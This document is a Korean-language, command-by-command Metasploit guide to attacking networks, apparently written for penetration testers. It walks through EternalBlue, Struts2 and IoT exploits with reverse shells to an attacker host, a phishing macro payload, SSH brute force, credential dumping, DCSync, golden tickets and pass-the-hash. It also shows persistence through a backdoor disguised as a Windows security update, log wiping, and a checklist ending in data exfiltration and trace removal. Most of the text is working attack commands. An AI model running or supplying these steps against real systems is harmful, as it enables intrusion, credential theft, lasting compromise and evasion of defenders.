# Metasploit 실제 공격 시나리오 가이드

## 시나리오 1: Windows SMB 취약점 공격 (가장 일반적)

### 상황: Windows 7/2008 Server EternalBlue 공격

#### 1단계: 타겟 발견 및 정찰

```bash
# 네트워크 스캔
nmap -sS -O 192.168.1.0/24

# SMB 서비스 확인
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Metasploit에서 확인
msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

#### 2단계: 익스플로잇 실행

```bash
# EternalBlue 익스플로잇 설정
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# 성공시 Meterpreter 세션 획득
meterpreter >
```

#### 3단계: 권한 상승 및 정보 수집

```bash
# 현재 권한 확인 (이미 SYSTEM일 가능성 높음)
meterpreter > getuid

# 시스템 정보 수집
meterpreter > sysinfo

# 안정적인 프로세스로 마이그레이션
meterpreter > ps | grep explorer
meterpreter > migrate 1234

# 크리덴셜 덤프
meterpreter > load kiwi
meterpreter > creds_all
```

#### 4단계: 지속성 확보

```bash
# 백도어 업로드
meterpreter > upload /root/backdoor.exe C:\\Windows\\System32\\svchost2.exe

# 레지스트리 지속성
meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Windows Security Update" -t REG_SZ -d "C:\\Windows\\System32\\svchost2.exe"

# 로그 삭제
meterpreter > clearev
```

## 시나리오 2: 웹 애플리케이션 공격을 통한 침투

### 상황: Apache Struts2 취약점 이용

#### 1단계: 웹 애플리케이션 스캔

```bash
# 웹 디렉토리 스캔
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/dir_scanner) > run

# Struts2 취약점 스캔
msf6 > use auxiliary/scanner/http/struts2_code_exec_parameters
msf6 auxiliary(scanner/http/struts2_code_exec_parameters) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/struts2_code_exec_parameters) > run
```

#### 2단계: 웹쉘 업로드

```bash
# Struts2 RCE 익스플로잇
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /struts2-showcase/
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 192.168.1.50
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
```

#### 3단계: 권한 상승 (Linux)

```bash
# 현재 사용자 확인
meterpreter > getuid

# 권한 상승 스크립트 실행
meterpreter > run post/multi/recon/local_exploit_suggester

# 커널 익스플로잇 시도
meterpreter > background
msf6 > use exploit/linux/local/cve_2016_5195_dirtycow
msf6 exploit(linux/local/cve_2016_5195_dirtycow) > set SESSION 1
msf6 exploit(linux/local/cve_2016_5195_dirtycow) > exploit
```

#### 4단계: 내부 네트워크 침투

```bash
# 네트워크 정보 수집
meterpreter > ifconfig
meterpreter > route

# 피벗팅 설정
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background

# SOCKS 프록시 설정
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run -j

# 내부 네트워크 스캔
proxychains nmap -sT 10.0.0.1-50 -p 22,80,443,3389
```

## 시나리오 3: 피싱 이메일을 통한 클라이언트 사이드 공격

### 상황: Office 매크로 기반 공격

#### 1단계: 악성 문서 생성

```bash
# VBA 매크로 페이로드 생성
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba

# 생성된 VBA 코드를 Word 문서에 삽입
# 사회공학적 내용과 함께 첨부파일 생성
```

#### 2단계: 리스너 설정

```bash
# 멀티핸들러 설정
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
```

#### 3단계: 희생자가 문서 실행시 세션 획득

```bash
# 세션 확인
msf6 > sessions

# Meterpreter 세션 접속
msf6 > sessions -i 1

# 기본 정보 수집
meterpreter > sysinfo
meterpreter > getuid
```

#### 4단계: 내부 정찰 및 측면 이동

```bash
# 도메인 정보 수집
meterpreter > run post/windows/gather/enum_domain

# 네트워크 드라이브 확인
meterpreter > run post/windows/gather/enum_shares

# 브라우저 저장된 패스워드 수집
meterpreter > run post/windows/gather/enum_chrome
meterpreter > run post/multi/gather/firefox_creds
```

## 시나리오 4: SSH 브루트포스 공격

### 상황: 리눅스 서버 SSH 서비스 대상

#### 1단계: SSH 서비스 확인

```bash
# 포트 스캔
nmap -p 22 192.168.1.0/24

# SSH 버전 확인
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

#### 2단계: 브루트포스 공격

```bash
# 일반적인 계정으로 브루트포스
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_login) > run

# 성공시 SSH 세션 획득
```

#### 3단계: 쉘에서 Meterpreter로 업그레이드

```bash
# 세션 확인
msf6 > sessions

# 쉘을 Meterpreter로 업그레이드
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
```

## 시나리오 5: Active Directory 환경 공격

### 상황: 도메인 컨트롤러 장악

#### 1단계: 도메인 정찰

```bash
# 첫 번째 시스템 장악 후
meterpreter > run post/windows/gather/enum_domain

# 도메인 컨트롤러 찾기
meterpreter > run post/windows/gather/enum_domain_controllers

# 도메인 사용자 열거
meterpreter > run post/windows/gather/enum_domain_users
```

#### 2단계: 크리덴셜 덤핑 및 해시 수집

```bash
# 로컬 크리덴셜 덤프
meterpreter > load kiwi
meterpreter > creds_all

# 도메인 해시 수집 (Golden Ticket 생성용)
meterpreter > dcsync_ntlm krbtgt
```

#### 3단계: Pass-the-Hash 공격

```bash
# 획득한 해시로 다른 시스템 접근
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.101
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > exploit
```

#### 4단계: 도메인 컨트롤러 장악

```bash
# DCSync 공격으로 모든 해시 덤프
meterpreter > dcsync_ntlm administrator
meterpreter > dcsync_ntlm krbtgt

# Golden Ticket 생성
meterpreter > golden_ticket_create -d domain.com -u administrator -s S-1-5-21-xxx -k aes256_key
```

## 시나리오 6: IoT 디바이스 공격

### 상황: 라우터/IP 카메라 등 IoT 기기

#### 1단계: IoT 디바이스 발견

```bash
# IoT 디바이스 스캔
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/http/http_version) > set PORTS 80,8080,8081
msf6 auxiliary(scanner/http/http_version) > run

# 기본 크리덴셜 시도
msf6 > use auxiliary/scanner/http/http_login
msf6 auxiliary(scanner/http/http_login) > set RHOSTS 192.168.1.200
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/http_default_users.txt
msf6 auxiliary(scanner/http/http_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
msf6 auxiliary(scanner/http/http_login) > run
```

#### 2단계: 알려진 취약점 공격

```bash
# 공통 IoT 취약점 공격
msf6 > use exploit/linux/http/dlink_hnap_login_bypass
msf6 exploit(linux/http/dlink_hnap_login_bypass) > set RHOSTS 192.168.1.200
msf6 exploit(linux/http/dlink_hnap_login_bypass) > set PAYLOAD linux/mipsle/meterpreter/reverse_tcp
msf6 exploit(linux/http/dlink_hnap_login_bypass) > exploit
```

## 고급 공격 시나리오

### 다단계 피벗팅 공격

```bash
# 1차 시스템 장악 (DMZ)
# 2차 내부 네트워크 침투
# 3차 서버 세그먼트 침투

# 각 단계마다 라우팅 추가
meterpreter > run autoroute -s 10.0.1.0/24    # DMZ 네트워크
meterpreter > run autoroute -s 10.0.2.0/24    # 내부 네트워크
meterpreter > run autoroute -s 10.0.3.0/24    # 서버 네트워크
```

### 지속적 침투 (APT 스타일)

```bash
# 1. 초기 침입
# 2. 지속성 확보 (여러 방법 동시 사용)
# 3. 정찰 및 수집
# 4. 측면 이동
# 5. 목표 달성

# 다중 백도어 설치
meterpreter > upload backdoor1.exe C:\\Windows\\System32\\
meterpreter > upload backdoor2.exe C:\\Users\\Public\\
meterpreter > run persistence -S -U -X -i 5 -p 4444 -r 192.168.1.50
```

## 실무 공격 체크리스트

### 초기 침투 단계

- [ ] 네트워크 스캔 및 서비스 열거
- [ ] 취약점 스캔 및 확인
- [ ] 익스플로잇 선택 및 실행
- [ ] 초기 세션 획득

### 권한 상승 단계

- [ ] 현재 권한 확인
- [ ] 로컬 익스플로잇 확인
- [ ] 권한 상승 시도
- [ ] 관리자 권한 확보

### 정보 수집 단계

- [ ] 시스템 정보 수집
- [ ] 네트워크 정보 수집
- [ ] 사용자 정보 수집
- [ ] 크리덴셜 덤핑

### 지속성 확보 단계

- [ ] 백도어 설치
- [ ] 지속성 메커니즘 설정
- [ ] 백업 통신 채널 설정
- [ ] 로그 삭제

### 측면 이동 단계

- [ ] 내부 네트워크 정찰
- [ ] 피벗팅 설정
- [ ] 추가 시스템 침투
- [ ] 도메인 장악 시도

### 목표 달성 단계

- [ ] 중요 데이터 식별
- [ ] 데이터 수집 및 유출
- [ ] 보고서 작성
- [ ] 흔적 제거

이러한 시나리오들은 실제 모의해킹에서 90% 이상 마주치는 상황들입니다. 각 단계별로 체계적으로 접근하면 성공률을 크게 높일 수 있습니다.
